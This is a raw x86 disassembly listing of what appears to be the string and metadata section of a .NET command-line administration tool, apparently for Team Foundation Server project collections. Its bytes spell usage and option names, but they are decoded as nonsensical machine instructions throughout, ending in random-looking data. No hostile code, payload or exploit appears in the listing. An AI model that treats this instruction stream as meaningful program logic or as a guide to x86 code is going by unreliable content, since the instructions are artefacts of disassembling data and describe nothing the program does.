  4041ba:	add    BYTE PTR gs:[esi+eiz*2+0x73],dl
  4041bf:	push   esp
  4041c0:	gs popa 
  4041c2:	ins    DWORD PTR es:[edi],dx
  4041c3:	push   eax
  4041c4:	jb     0x404235
  4041c6:	push   0x65
  4041c8:	arpl   WORD PTR [ebx+eax*2+0x6f],si
  4041cc:	ins    BYTE PTR es:[edi],dx
  4041cd:	ins    BYTE PTR es:[edi],dx
  4041ce:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4041d3:	outs   dx,BYTE PTR ds:[esi]
  4041d4:	inc    esi
  4041d5:	popa   
  4041d6:	arpl   WORD PTR [edi+ebp*2+0x72],si
  4041da:	jns    0x4041dc
  4041dc:	inc    edi
  4041dd:	gs je  0x404234
  4041e0:	gs popa 
  4041e2:	ins    DWORD PTR es:[edi],dx
  4041e3:	push   eax
  4041e4:	jb     0x404255
  4041e6:	push   0x65
  4041e8:	arpl   WORD PTR [ebx+eax*2+0x6f],si
  4041ec:	ins    BYTE PTR es:[edi],dx
  4041ed:	ins    BYTE PTR es:[edi],dx
  4041ee:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4041f3:	outs   dx,BYTE PTR ds:[esi]
  4041f4:	add    BYTE PTR [esi+eiz*2+0x73],dl
  4041f8:	inc    ebx
  4041f9:	outs   dx,DWORD PTR ds:[esi]
  4041fa:	outs   dx,BYTE PTR ds:[esi]
  4041fb:	outs   dx,BYTE PTR ds:[esi]
  4041fc:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  404201:	outs   dx,BYTE PTR ds:[esi]
  404202:	add    BYTE PTR [ebp+0x6e],al
  404205:	jae    0x40427c
  404207:	jb     0x40426e
  404209:	inc    ecx
  40420a:	jne    0x404280
  40420c:	push   0x69746e65
  404211:	arpl   WORD PTR [ecx+0x74],sp
  404214:	gs add BYTE PTR fs:[edi+0x65],ah
  404219:	je     0x40427a
  40421b:	inc    ebx
  40421c:	jne    0x404290
  40421e:	jb     0x404285
  404220:	outs   dx,BYTE PTR ds:[esi]
  404221:	je     0x404266
  404223:	jne    0x404291
  404225:	je     0x40429c
  404227:	jb     0x40428e
  404229:	add    BYTE PTR [ecx+0x46],cl
  40422c:	outs   dx,DWORD PTR ds:[esi]
  40422d:	jb     0x40429c
  40422f:	popa   
  404230:	je     0x404282
  404232:	jb     0x4042a3
  404234:	jbe    0x40429f
  404236:	fs gs jb 0x40423a
  40423a:	inc    esi
  40423b:	outs   dx,DWORD PTR ds:[esi]
  40423c:	jb     0x4042ab
  40423e:	popa   
  40423f:	je     0x404241
  404241:	push   edi
  404242:	jb     0x4042ad
  404244:	je     0x4042ab
  404246:	add    BYTE PTR [edx+0x65],dl
  404249:	popa   
  40424a:	fs dec esp
  40424c:	imul   ebp,DWORD PTR [esi+0x65],0x69725700
  404253:	je     0x4042ba
  404255:	dec    esp
  404256:	imul   ebp,DWORD PTR [esi+0x65],0x72745300
  40425d:	imul   ebp,DWORD PTR [esi+0x67],0x706d6f43
  404264:	popa   
  404265:	jb     0x4042d0
  404267:	jae    0x4042d8
  404269:	outs   dx,BYTE PTR ds:[esi]
  40426a:	add    BYTE PTR [ebx+0x74],dl
  40426d:	popa   
  40426e:	jb     0x4042e4
  404270:	jae    0x4042c9
  404272:	imul   esi,DWORD PTR [eax+ebp*2+0x0],0x5f746567
  40427a:	dec    eax
  40427b:	popa   
  40427c:	jae    0x4042d5
  40427e:	jae    0x4042f3
  404280:	push   esp
  404281:	outs   dx,DWORD PTR ds:[esi]
  404282:	inc    esp
  404283:	gs ins BYTE PTR es:[edi],dx
  404285:	gs je  0x4042ed
  404288:	add    BYTE PTR [ebx+0x74],dl
  40428b:	popa   
  40428c:	je     0x404303
  40428e:	jae    0x4042d5
  404290:	jbe    0x4042f7
  404292:	outs   dx,BYTE PTR ds:[esi]
  404293:	je     0x4042dd
  404295:	popa   
  404296:	outs   dx,BYTE PTR ds:[esi]
  404297:	fs ins BYTE PTR es:[edi],dx
  404299:	gs jb  0x40429c
  40429c:	popa   
  40429d:	fs fs pop edi
  4042a0:	push   ebx
  4042a1:	je     0x404304
  4042a3:	je     0x40431a
  4042a5:	jae    0x4042ec
  4042a7:	jbe    0x40430e
  4042a9:	outs   dx,BYTE PTR ds:[esi]
  4042aa:	je     0x4042ac
  4042ac:	jae    0x404313
  4042ae:	je     0x40430f
  4042b0:	inc    ebp
  4042b1:	js     0x404316
  4042b3:	ins    BYTE PTR es:[edi],dx
  4042b4:	jne    0x40431a
  4042b6:	gs push edi
  4042b8:	jae    0x40432d
  4042ba:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  4042be:	gs je  0x404326
  4042c1:	add    BYTE PTR [ebx+0x79],dl
  4042c4:	jae    0x40433a
  4042c6:	gs ins DWORD PTR es:[edi],dx
  4042c8:	cs dec ecx
  4042ca:	dec    edi
  4042cb:	add    BYTE PTR [ebp+eiz*2+0x78],dl
  4042cf:	je     0x404328
  4042d1:	jb     0x40433c
  4042d3:	je     0x40433a
  4042d5:	jb     0x4042d7
  4042d7:	addr16 gs je 0x40433a
  4042db:	inc    ebp
  4042dc:	jb     0x404350
  4042de:	outs   dx,DWORD PTR ds:[esi]
  4042df:	jb     0x4042e1
  4042e1:	inc    ebp
  4042e2:	js     0x404347
  4042e4:	gs jo  0x40435b
  4042e7:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  4042ee:	pop    edi
  4042ef:	dec    ebp
  4042f0:	gs jae 0x404366
  4042f3:	popa   
  4042f4:	add    BYTE PTR gs:[di+0x69],cl
  4042f9:	arpl   WORD PTR [edx+0x6f],si
  4042fc:	jae    0x40436d
  4042fe:	data16 je 0x40432f
  404301:	push   esp
  404302:	gs popa 
  404304:	ins    DWORD PTR es:[edi],dx
  404305:	inc    esi
  404306:	outs   dx,DWORD PTR ds:[esi]
  404307:	jne    0x404377
  404309:	fs popa 
  40430b:	je     0x404376
  40430d:	outs   dx,DWORD PTR ds:[esi]
  40430e:	outs   dx,BYTE PTR ds:[esi]
  40430f:	cs inc ebx
  404311:	outs   dx,DWORD PTR ds:[esi]
  404312:	ins    DWORD PTR es:[edi],dx
  404313:	ins    DWORD PTR es:[edi],dx
  404314:	outs   dx,DWORD PTR ds:[esi]
  404315:	outs   dx,BYTE PTR ds:[esi]
  404316:	add    BYTE PTR [ebp+0x69],cl
  404319:	arpl   WORD PTR [edx+0x6f],si
  40431c:	jae    0x40438d
  40431e:	data16 je 0x40434f
  404321:	push   esp
  404322:	gs popa 
  404324:	ins    DWORD PTR es:[edi],dx
  404325:	inc    esi
  404326:	outs   dx,DWORD PTR ds:[esi]
  404327:	jne    0x404397
  404329:	fs popa 
  40432b:	je     0x404396
  40432d:	outs   dx,DWORD PTR ds:[esi]
  40432e:	outs   dx,BYTE PTR ds:[esi]
  40432f:	add    BYTE PTR [ebp+eiz*2+0x61],dl
  404333:	ins    DWORD PTR es:[edi],dx
  404334:	inc    esi
  404335:	outs   dx,DWORD PTR ds:[esi]
  404336:	jne    0x4043a6
  404338:	fs popa 
  40433a:	je     0x4043a5
  40433c:	outs   dx,DWORD PTR ds:[esi]
  40433d:	outs   dx,BYTE PTR ds:[esi]
  40433e:	dec    ecx
  40433f:	outs   dx,BYTE PTR ds:[esi]
  404340:	jbe    0x4043a3
  404342:	ins    BYTE PTR es:[edi],dx
  404343:	imul   esp,DWORD PTR [ebx+edx*2+0x65],0x72657672
  40434b:	dec    esi
  40434c:	popa   
  40434d:	ins    DWORD PTR es:[edi],dx
  40434e:	gs inc ebp
  404350:	js     0x4043b5
  404352:	gs jo  0x4043c9
  404355:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  40435c:	pop    edi
  40435d:	ins    DWORD PTR es:[edi],dx
  40435e:	gs jae 0x4043d4
  404361:	popa   
  404362:	add    BYTE PTR gs:[bx+0x65],ah
  404367:	je     0x4043c8
  404369:	dec    esp
  40436a:	outs   dx,BYTE PTR gs:[esi]
  40436c:	addr16 je 0x4043d7
  40436f:	add    BYTE PTR [edi+0x65],ah
  404372:	je     0x4043d3
  404374:	inc    ebx
  404375:	push   0x737261
  40437a:	inc    ebx
  40437b:	push   0x53007261
  404380:	jo     0x4043ee
  404382:	imul   esi,DWORD PTR [eax+eax*1+0x53],0x74736275
  40438a:	jb     0x4043f5
  40438c:	outs   dx,BYTE PTR ds:[esi]
  40438d:	add    BYTE PTR [si+0x6f],dl
  404391:	push   ebp
  404392:	jo     0x404404
  404394:	gs jb  0x4043e0
  404397:	outs   dx,BYTE PTR ds:[esi]
  404398:	jbe    0x4043fb
  40439a:	jb     0x404405
  40439c:	popa   
  40439d:	outs   dx,BYTE PTR ds:[esi]
  40439e:	je     0x4043a0
  4043a0:	cmp    al,0x50
  4043a2:	jb     0x40440d
  4043a4:	jbe    0x404407
  4043a6:	je     0x40440d
  4043a8:	dec    ecx
  4043a9:	ins    DWORD PTR es:[edi],dx
  4043aa:	jo     0x404418
  4043ac:	gs ins DWORD PTR es:[edi],dx
  4043ae:	outs   dx,BYTE PTR gs:[esi]
  4043b0:	je     0x404413
  4043b2:	je     0x40441d
  4043b4:	outs   dx,DWORD PTR ds:[esi]
  4043b5:	outs   dx,BYTE PTR ds:[esi]
  4043b6:	inc    esp
  4043b7:	gs je  0x40441b
  4043ba:	imul   ebp,DWORD PTR [ebx+esi*2+0x3e],0x3332437b
  4043c2:	cmp    BYTE PTR [eax],dh
  4043c4:	inc    esp
  4043c5:	xor    al,0x45
  4043c7:	sub    eax,0x37394642
  4043cc:	sub    eax,0x32464134
  4043d1:	sub    eax,0x42414138
  4043d6:	sub    eax,0x44364145
  4043db:	xor    al,BYTE PTR [esi+esi*1+0x42]
  4043df:	xor    al,BYTE PTR [ebp+0x43]
  4043e2:	inc    esi
  4043e3:	jge    0x4043e5
  4043e5:	inc    ebx
  4043e6:	outs   dx,DWORD PTR ds:[esi]
  4043e7:	ins    DWORD PTR es:[edi],dx
  4043e8:	jo     0x404453
  4043ea:	ins    BYTE PTR es:[edi],dx
  4043eb:	gs jb  0x404435
  4043ee:	outs   dx,BYTE PTR gs:[esi]
  4043f0:	gs jb  0x404454
  4043f3:	je     0x40445a
  4043f5:	fs inc ecx
  4043f7:	je     0x40446d
  4043f9:	jb     0x404464
  4043fb:	bound  esi,QWORD PTR [ebp+0x74]
  4043fe:	add    BYTE PTR gs:[ebx+0x79],dl
  404402:	jae    0x404478
  404404:	gs ins DWORD PTR es:[edi],dx
  404406:	cs inc ebx
  404408:	outs   dx,DWORD PTR ds:[esi]
  404409:	ins    BYTE PTR es:[edi],dx
  40440a:	ins    BYTE PTR es:[edi],dx
  40440b:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  404410:	outs   dx,BYTE PTR ds:[esi]
  404411:	jae    0x404441
  404413:	inc    edi
  404414:	outs   dx,BYTE PTR gs:[esi]
  404416:	gs jb  0x404482
  404419:	arpl   WORD PTR [eax],ax
  40441b:	inc    esp
  40441c:	imul   esp,DWORD PTR [ebx+0x74],0x616e6f69
  404423:	jb     0x40449e
  404425:	pusha  
  404426:	xor    al,BYTE PTR [eax]
  404428:	and    al,0x24
  40442a:	ins    DWORD PTR es:[edi],dx
  40442b:	gs je  0x404496
  40442e:	outs   dx,DWORD PTR ds:[esi]
  40442f:	xor    BYTE PTR fs:[eax+0x36],bh
  404433:	xor    BYTE PTR [eax],dh
  404435:	xor    BYTE PTR [eax],dh
  404437:	xor    BYTE PTR [ebx],dh
  404439:	sub    eax,0x64410031
  40443e:	add    BYTE PTR fs:[edx+esi*2+0x79],dl
  404443:	inc    edi
  404444:	gs je  0x40449d
  404447:	popa   
  404448:	ins    BYTE PTR es:[edi],dx
  404449:	jne    0x4044b0
  40444b:	add    BYTE PTR [edi+0x70],ch
  40444e:	pop    edi
  40444f:	inc    ebp
  404450:	jno    0x4044c7
  404452:	popa   
  404453:	ins    BYTE PTR es:[edi],dx
  404454:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x636e6f43
  40445c:	popa   
  40445d:	je     0x40445f
  40445f:	arpl   WORD PTR cs:[ebx+0x74],sp
  404463:	outs   dx,DWORD PTR ds:[esi]
  404464:	jb     0x404466
  404466:	push   ebx
  404467:	jns    0x4044dc
  404469:	je     0x4044d0
  40446b:	ins    DWORD PTR es:[edi],dx
  40446c:	cs inc ebx
  40446e:	outs   dx,DWORD PTR ds:[esi]
  40446f:	fs gs inc esp
  404472:	outs   dx,DWORD PTR ds:[esi]
  404473:	ins    DWORD PTR es:[edi],dx
  404474:	cs inc ebx
  404476:	outs   dx,DWORD PTR ds:[esi]
  404477:	ins    DWORD PTR es:[edi],dx
  404478:	jo     0x4044e3
  40447a:	ins    BYTE PTR es:[edi],dx
  40447b:	gs jb  0x40447e
  40447e:	inc    edi
  40447f:	outs   dx,BYTE PTR gs:[esi]
  404481:	gs jb  0x4044e5
  404484:	je     0x4044eb
  404486:	fs inc ebx
  404488:	outs   dx,DWORD PTR ds:[esi]
  404489:	fs gs inc ecx
  40448c:	je     0x404502
  40448e:	jb     0x4044f9
  404490:	bound  esi,QWORD PTR [ebp+0x74]
  404493:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  404498:	jne    0x404501
  40449a:	addr16 gs jb 0x4044ec
  40449e:	outs   dx,DWORD PTR ds:[esi]
  40449f:	outs   dx,BYTE PTR ds:[esi]
  4044a0:	push   ebp
  4044a1:	jae    0x404508
  4044a3:	jb     0x4044e8
  4044a5:	outs   dx,DWORD PTR ds:[esi]
  4044a6:	fs gs inc ecx
  4044a9:	je     0x40451f
  4044ab:	jb     0x404516
  4044ad:	bound  esi,QWORD PTR [ebp+0x74]
  4044b0:	add    BYTE PTR gs:[edx+0x65],dl
  4044b4:	data16 gs jb 0x40451d
  4044b8:	outs   dx,BYTE PTR ds:[esi]
  4044b9:	arpl   WORD PTR [ebp+0x45],sp
  4044bc:	jno    0x404533
  4044be:	popa   
  4044bf:	ins    BYTE PTR es:[edi],dx
  4044c0:	jae    0x4044c2
  4044c2:	push   esp
  4044c3:	jns    0x404535
  4044c5:	add    BYTE PTR gs:[edx+0x75],dl
  4044c9:	outs   dx,BYTE PTR ds:[esi]
  4044ca:	je     0x404535
  4044cc:	ins    DWORD PTR es:[edi],dx
  4044cd:	gs push esp
  4044cf:	jns    0x404541
  4044d1:	gs dec eax
  4044d3:	popa   
  4044d4:	outs   dx,BYTE PTR ds:[esi]
  4044d5:	fs ins BYTE PTR es:[edi],dx
  4044d7:	add    BYTE PTR gs:[edi+0x65],al
  4044db:	je     0x404531
  4044dd:	jns    0x40454f
  4044df:	gs inc esi
  4044e1:	jb     0x404552
  4044e3:	ins    DWORD PTR es:[edi],dx
  4044e4:	dec    eax
  4044e5:	popa   
  4044e6:	outs   dx,BYTE PTR ds:[esi]
  4044e7:	fs ins BYTE PTR es:[edi],dx
  4044e9:	add    BYTE PTR gs:[ecx+0x73],al
  4044ed:	jae    0x404554
  4044ef:	ins    DWORD PTR es:[edi],dx
  4044f0:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  4044f4:	addr16 gs je 0x404557
  4044f8:	inc    ecx
  4044f9:	jae    0x40456e
  4044fb:	gs ins DWORD PTR es:[edi],dx
  4044fd:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  404501:	inc    edi
  404502:	gs je  0x404558
  404505:	je     0x404579
  404507:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  40450e:	je     0x404575
  404510:	ins    DWORD PTR es:[edi],dx
  404511:	cs inc ebx
  404513:	outs   dx,DWORD PTR ds:[esi]
  404514:	ins    DWORD PTR es:[edi],dx
  404515:	jo     0x404586
  404517:	outs   dx,BYTE PTR ds:[esi]
  404518:	outs   dx,BYTE PTR gs:[esi]
  40451a:	je     0x404569
  40451c:	outs   dx,DWORD PTR ds:[esi]
  40451d:	fs gs ins BYTE PTR es:[edi],dx
  404520:	add    BYTE PTR [ebp+0x64],al
  404523:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  40452b:	jae    0x40458e
  40452d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  404531:	je     0x4045a7
  404533:	jb     0x40459e
  404535:	bound  esi,QWORD PTR [ebp+0x74]
  404538:	add    BYTE PTR gs:[ebp+0x64],al
  40453c:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  404544:	jae    0x4045a7
  404546:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  40454a:	je     0x4045ad
  40454c:	je     0x4045b3
  40454e:	add    BYTE PTR [edx+0x65],dl
  404551:	jae    0x4045c2
  404553:	jne    0x4045c7
  404555:	arpl   WORD PTR [ebp+0x73],sp
  404558:	cs jb  0x4045c0
  40455b:	jae    0x4045cc
  40455d:	jne    0x4045d1
  40455f:	arpl   WORD PTR [ebp+0x73],sp
  404562:	add    BYTE PTR [eax],al
  404564:	add    BYTE PTR ds:0x6e0065,al
  40456a:	add    BYTE PTR [ebx],al
  40456c:	aas    
  40456d:	add    BYTE PTR [eax],al
  40456f:	add    eax,DWORD PTR [esi+0x0]
  404572:	add    BYTE PTR [ebx],cl
  404574:	inc    esi
  404575:	add    BYTE PTR [edi+0x0],cl
  404578:	push   edx
  404579:	add    BYTE PTR [ebx+0x0],al
  40457c:	inc    ebp
  40457d:	add    BYTE PTR [eax],al
  40457f:	add    edx,DWORD PTR [ecx+0x0]
  404582:	add    BYTE PTR [ebx],al
  404584:	push   ebx
  404585:	add    BYTE PTR [eax],al
  404587:	or     eax,0x450053
  40458c:	push   edx
  40458d:	add    BYTE PTR [esi+0x0],dl
  404590:	inc    ebp
  404591:	add    BYTE PTR [edx+0x0],dl
  404594:	add    BYTE PTR [ebx],al
  404596:	inc    ebx
  404597:	add    BYTE PTR [eax],al
  404599:	adc    eax,0x4f0043
  40459e:	dec    esp
  40459f:	add    BYTE PTR [eax+eax*1+0x45],cl
  4045a3:	add    BYTE PTR [ebx+0x0],al
  4045a6:	push   esp
  4045a7:	add    BYTE PTR [ecx+0x0],cl
  4045aa:	dec    edi
  4045ab:	add    BYTE PTR [esi+0x0],cl
  4045ae:	add    BYTE PTR ds:0x580045,dl
  4045b4:	inc    ebx
  4045b5:	add    BYTE PTR [eax+eax*1+0x55],cl
  4045b9:	add    BYTE PTR [eax+eax*1+0x45],al
  4045bd:	add    BYTE PTR [edi+0x0],dl
  4045c0:	push   ebx
  4045c1:	add    BYTE PTR [ebx+0x0],dl
  4045c4:	add    BYTE PTR ds:0x6f0063,dl
  4045ca:	ins    BYTE PTR es:[edi],dx
  4045cb:	add    BYTE PTR [eax+eax*1+0x65],ch
  4045cf:	add    BYTE PTR [ebx+0x0],ah
  4045d2:	je     0x4045d4
  4045d4:	imul   eax,DWORD PTR [eax],0x6e006f
  4045da:	add    BYTE PTR [ebx],dl
  4045dc:	push   edx
  4045dd:	add    BYTE PTR [ebp+0x0],ah
  4045e0:	jae    0x4045e2
  4045e2:	outs   dx,DWORD PTR ds:[esi]
  4045e3:	add    BYTE PTR [ebp+0x0],dh
  4045e6:	jb     0x4045e8
  4045e8:	arpl   WORD PTR [eax],ax
  4045ea:	add    BYTE PTR gs:[ebx+0x0],dh
  4045ee:	add    BYTE PTR ds:0x610042,cl
  4045f4:	outs   dx,BYTE PTR ds:[esi]
  4045f5:	add    BYTE PTR [esi+0x0],ch
  4045f8:	add    BYTE PTR gs:[edx+0x0],dh
  4045fc:	add    BYTE PTR [ebx],bl
  4045fe:	inc    esp
  4045ff:	add    BYTE PTR [ebp+0x0],ah
  404602:	ins    BYTE PTR es:[edi],dx
  404603:	add    BYTE PTR [ebp+0x0],ah
  404606:	je     0x404608
  404608:	add    BYTE PTR gs:[edi+0x0],dl
  40460c:	popa   
  40460d:	add    BYTE PTR [edx+0x0],dh
  404610:	outs   dx,BYTE PTR ds:[esi]
  404611:	add    BYTE PTR [ecx+0x0],ch
  404614:	outs   dx,BYTE PTR ds:[esi]
  404615:	add    BYTE PTR [edi+0x0],ah
  404618:	add    BYTE PTR [ebx],dh
  40461a:	inc    esp
  40461b:	add    BYTE PTR [ebp+0x0],ah
  40461e:	ins    BYTE PTR es:[edi],dx
  40461f:	add    BYTE PTR [ebp+0x0],ah
  404622:	je     0x404624
  404624:	add    BYTE PTR gs:[edi+0x0],dl
  404628:	jae    0x40462a
  40462a:	jae    0x40462c
  40462c:	push   ebx
  40462d:	add    BYTE PTR [ecx+0x0],ch
  404630:	je     0x404632
  404632:	add    BYTE PTR gs:[ebx+0x0],al
  404636:	outs   dx,DWORD PTR ds:[esi]
  404637:	add    BYTE PTR [esi+0x0],ch
  40463a:	data16 add BYTE PTR [ecx+0x0],ch
  40463e:	jb     0x404640
  404640:	ins    DWORD PTR es:[edi],dx
  404641:	add    BYTE PTR [ecx+0x0],ah
  404644:	je     0x404646
  404646:	imul   eax,DWORD PTR [eax],0x6e006f
  40464c:	add    BYTE PTR [ebx],bl
  40464e:	dec    ecx
  40464f:	add    BYTE PTR [esi+0x0],ch
  404652:	jbe    0x404654
  404654:	popa   
  404655:	add    BYTE PTR [eax+eax*1+0x69],ch
  404659:	add    BYTE PTR [eax+eax*1+0x53],ah
  40465d:	add    BYTE PTR [ebp+0x0],ah
  404660:	jb     0x404662
  404662:	jbe    0x404664
  404664:	add    BYTE PTR gs:[edx+0x0],dh
  404668:	add    BYTE PTR [ecx],dl
  40466a:	dec    esi
  40466b:	add    BYTE PTR [edi+0x0],ch
  40466e:	inc    ecx
  40466f:	add    BYTE PTR [esi+0x0],ch
  404672:	jae    0x404674
  404674:	ja     0x404676
  404676:	add    BYTE PTR gs:[edx+0x0],dh
  40467a:	add    BYTE PTR [ebx],dh
  40467c:	dec    edi
  40467d:	add    BYTE PTR [edx+0x0],ah
  404680:	jae    0x404682
  404682:	outs   dx,DWORD PTR ds:[esi]
  404683:	add    BYTE PTR [eax+eax*1+0x65],ch
  404687:	add    BYTE PTR [eax+eax*1+0x65],dh
  40468b:	add    BYTE PTR [ebx+0x0],al
  40468e:	outs   dx,DWORD PTR ds:[esi]
  40468f:	add    BYTE PTR [ebp+0x0],ch
  404692:	ins    DWORD PTR es:[edi],dx
  404693:	add    BYTE PTR [ecx+0x0],ah
  404696:	outs   dx,BYTE PTR ds:[esi]
  404697:	add    BYTE PTR [eax+eax*1+0x4c],ah
  40469b:	add    BYTE PTR [ecx+0x0],ch
  40469e:	outs   dx,BYTE PTR ds:[esi]
  40469f:	add    BYTE PTR [ebp+0x0],ah
  4046a2:	dec    edi
  4046a3:	add    BYTE PTR [eax+0x0],dh
  4046a6:	je     0x4046a8
  4046a8:	imul   eax,DWORD PTR [eax],0x6e006f
  4046ae:	add    BYTE PTR [ebx],bl
  4046b0:	push   ebp
  4046b1:	add    BYTE PTR [esi+0x0],ch
  4046b4:	imul   eax,DWORD PTR [eax],0x6e
  4046b7:	add    BYTE PTR [edi+0x0],ch
  4046ba:	ja     0x4046bc
  4046bc:	outs   dx,BYTE PTR ds:[esi]
  4046bd:	add    BYTE PTR [edi+0x0],cl
  4046c0:	jo     0x4046c2
  4046c2:	je     0x4046c4
  4046c4:	imul   eax,DWORD PTR [eax],0x6e006f
  4046ca:	add    BYTE PTR [ebx],cl
  4046cc:	push   ebp
  4046cd:	add    BYTE PTR [ebx+0x0],dh
  4046d0:	popa   
  4046d1:	add    BYTE PTR [edi+0x0],ah
  4046d4:	add    BYTE PTR gs:[eax],al
  4046d7:	or     eax,0x730055
  4046dc:	popa   
  4046dd:	add    BYTE PTR [edi+0x0],ah
  4046e0:	add    BYTE PTR gs:[edx],dh
  4046e3:	add    BYTE PTR [eax],al
  4046e5:	pop    ds
  4046e6:	push   ebp
  4046e7:	add    BYTE PTR [ebx+0x0],dh
  4046ea:	popa   
  4046eb:	add    BYTE PTR [edi+0x0],ah
  4046ee:	add    BYTE PTR gs:[ebp+0x0],al
  4046f2:	js     0x4046f4
  4046f4:	arpl   WORD PTR [eax],ax
  4046f6:	ins    BYTE PTR es:[edi],dx
  4046f7:	add    BYTE PTR [ebp+0x0],dh
  4046fa:	add    BYTE PTR fs:[ebp+0x0],ah
  4046fe:	push   edi
  4046ff:	add    BYTE PTR [ebx+0x0],dh
  404702:	jae    0x404704
  404704:	add    BYTE PTR ds:0x730055,dl
  40470a:	popa   
  40470b:	add    BYTE PTR [edi+0x0],ah
  40470e:	add    BYTE PTR gs:[esi+0x0],al
  404712:	outs   dx,DWORD PTR ds:[esi]
  404713:	add    BYTE PTR [edx+0x0],dh
  404716:	arpl   WORD PTR [eax],ax
  404718:	add    BYTE PTR gs:[eax],al
  40471b:	sub    eax,0x730055
  404720:	popa   
  404721:	add    BYTE PTR [edi+0x0],ah
  404724:	add    BYTE PTR gs:[eax+0x0],dl
  404728:	jb     0x40472a
  40472a:	outs   dx,DWORD PTR ds:[esi]
  40472b:	add    BYTE PTR [edx+0x0],ch
  40472e:	add    BYTE PTR gs:[ebx+0x0],ah
  404732:	je     0x404734
  404734:	inc    ebx
  404735:	add    BYTE PTR [edi+0x0],ch
  404738:	ins    BYTE PTR es:[edi],dx
  404739:	add    BYTE PTR [eax+eax*1+0x65],ch
  40473d:	add    BYTE PTR [ebx+0x0],ah
  404740:	je     0x404742
  404742:	imul   eax,DWORD PTR [eax],0x6e006f
  404748:	add    BYTE PTR [ecx],ah
  40474a:	push   ebp
  40474b:	add    BYTE PTR [ebx+0x0],dh
  40474e:	popa   
  40474f:	add    BYTE PTR [edi+0x0],ah
  404752:	add    BYTE PTR gs:[eax+0x0],dl
  404756:	jb     0x404758
  404758:	outs   dx,DWORD PTR ds:[esi]
  404759:	add    BYTE PTR [edx+0x0],ch
  40475c:	add    BYTE PTR gs:[ebx+0x0],ah
  404760:	je     0x404762
  404762:	dec    esi
  404763:	add    BYTE PTR [ecx+0x0],ah
  404766:	ins    DWORD PTR es:[edi],dx
  404767:	add    BYTE PTR [ebp+0x0],ah
  40476a:	add    BYTE PTR ds:0x730055,dl
  404770:	popa   
  404771:	add    BYTE PTR [edi+0x0],ah
  404774:	add    BYTE PTR gs:[ecx+0x0],dl
  404778:	jne    0x40477a
  40477a:	imul   eax,DWORD PTR [eax],0x740065
  404780:	add    BYTE PTR [ebx],dl
  404782:	pop    ecx
  404783:	add    BYTE PTR [ebp+0x0],ah
  404786:	jae    0x404788
  404788:	inc    ecx
  404789:	add    BYTE PTR [esi+0x0],ch
  40478c:	jae    0x40478e
  40478e:	ja     0x404790
  404790:	add    BYTE PTR gs:[edx+0x0],dh
  404794:	add    BYTE PTR [eax],al
  404796:	add    BYTE PTR [eax],al
  404798:	dec    esi
  404799:	or     eax,0xbf97c238
  40479e:	repnz dec edx
  4047a0:	mov    ch,BYTE PTR [ebx+0x6b2d6dea]
  4047a6:	cs iret 
  4047a8:	add    BYTE PTR [eax],cl
  4047aa:	mov    bh,0x7a
  4047ac:	pop    esp
  4047ad:	push   esi
  4047ae:	sbb    DWORD PTR [eax+eiz*8],esi
  4047b1:	mov    DWORD PTR [edx],eax
  4047b3:	push   es
  4047b4:	add    al,BYTE PTR [edx]
  4047b6:	push   es
  4047b7:	push   cs
  4047b8:	add    eax,0x1d010100
  4047bd:	push   cs
  4047be:	or     BYTE PTR [eax+0x117f5f3f],dh
  4047c4:	aad    0xa
  4047c6:	cmp    al,BYTE PTR [esi]
  4047c8:	add    BYTE PTR [edx],al
  4047ca:	add    DWORD PTR [edx+edx*1],ebx
  4047cd:	or     eax,0x1000003
  4047d2:	add    esp,DWORD PTR [eax]
  4047d4:	add    BYTE PTR [ecx],al
  4047d6:	add    eax,DWORD PTR [esi]
  4047d8:	adc    dl,BYTE PTR [ecx]
  4047da:	add    eax,DWORD PTR [esi]
  4047dc:	adc    dl,BYTE PTR ds:0x12000004
  4047e2:	adc    DWORD PTR [eax+eax*1],eax
  4047e5:	add    BYTE PTR [edx],dl
  4047e7:	adc    eax,0x1010005
  4047ec:	adc    dl,BYTE PTR ds:0xe000003
  4047f2:	add    al,0x8
  4047f4:	add    BYTE PTR [edx],dl
  4047f6:	adc    DWORD PTR [eax+ecx*1],eax
  4047f9:	add    BYTE PTR [edx],dl
  4047fb:	adc    eax,0xe000803
  404800:	add    al,0x20
  404802:	add    DWORD PTR [ecx],eax
  404804:	push   cs
  404805:	add    al,0x20
  404807:	add    DWORD PTR [ecx],eax
  404809:	add    al,BYTE PTR ds:0xe010220
  40480f:	push   cs
  404810:	add    eax,0x11010120
  404815:	gs add al,0x20
  404818:	add    DWORD PTR [ecx],eax
  40481a:	or     BYTE PTR [eax+0x2400a0],al
  404820:	add    BYTE PTR [eax+eax*4],al
  404823:	add    BYTE PTR [eax],al
  404825:	xchg   esp,eax
  404826:	add    BYTE PTR [eax],al
  404828:	add    BYTE PTR [esi],al
  40482a:	add    al,BYTE PTR [eax]
  40482c:	add    BYTE PTR [eax],al
  40482e:	and    al,0x0
  404830:	add    BYTE PTR [edx+0x53],dl
  404833:	inc    ecx
  404834:	xor    DWORD PTR [eax],eax
  404836:	add    al,0x0
  404838:	add    BYTE PTR [ecx],al
  40483a:	add    BYTE PTR [ecx],al
  40483c:	add    BYTE PTR [edi],al
  40483e:	sar    edx,1
  404840:	push   edi
  404841:	les    ebp,FWORD PTR [esi+0x2ea3f0d9]
  404847:	test   BYTE PTR [edx+0xdfdae0f],ch
  40484d:	jmp    0xecab463a
  404852:	pop    DWORD PTR [edi+0x6c7603fb]
  404858:	or     DWORD PTR [ecx+ebx*4-0x6e],0x1e
  40485d:	mov    dl,0x3b
  40485f:	out    0x9a,eax
  404861:	(bad)  
  404863:	fadd   st(1),st
  404865:	fstp   QWORD PTR [edx+0x211336d2]
  40486b:	add    dl,BYTE PTR [eax-0x6c38df5]
